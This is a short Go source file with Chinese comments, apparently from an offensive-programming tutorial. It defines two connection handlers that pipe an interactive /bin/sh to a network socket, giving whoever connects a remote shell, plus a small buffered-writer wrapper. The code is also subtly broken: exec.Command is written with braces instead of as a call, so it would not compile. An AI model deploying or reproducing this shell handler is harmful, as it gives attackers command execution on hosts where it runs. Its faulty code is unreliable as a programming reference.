package 流量转发之后

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

//Flusher包装bufio.Writer,显式刷新所有写入
type Flusher struct {
	w *bufio.Writer
}

//NewFlusher从io.Writer创建一个新的Flusher
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w:bufio.NewWriter(w),
	}
}

//写入数据并显式刷新缓冲区
func (foo *Flusher) Write(b []byte)(int,error) {
	count,err:=foo.w.Write(b)
	if err!=nil{
		return -1,err

	}
	if err:=foo.w.Flush();err!=nil{
		return -1,err
	}
	return count,err
}

func handle(conn net.Conn) {
	cmd:=exec.Command{"/bin/sh","-i"}

	//将标准输入设置为我们到连接
	cmd.Stdin=conn

	//从连接创建一个Flusher用于标准输出
	//确保标准输出被充分并通过net.Conn发送
	cmd.Stdout=NewFlusher(conn)

	//运行命令
	if err:=cmd.Run();err!=nil{
		log.Fatalln(err)
	}
}



// 重写handle函数
func handle_new(conn net.Conn) {
	cmd:=exec.Command{"/bin/sh","-i"}
	//将表村输入设置为我们的连接
	rp,wp:=io.Pipe()
	cmd.Stdin=conn
	cmd.Stdout=wp
	go io.Copy(conn,rp)
	cmd.Run()
	conn.Close()
}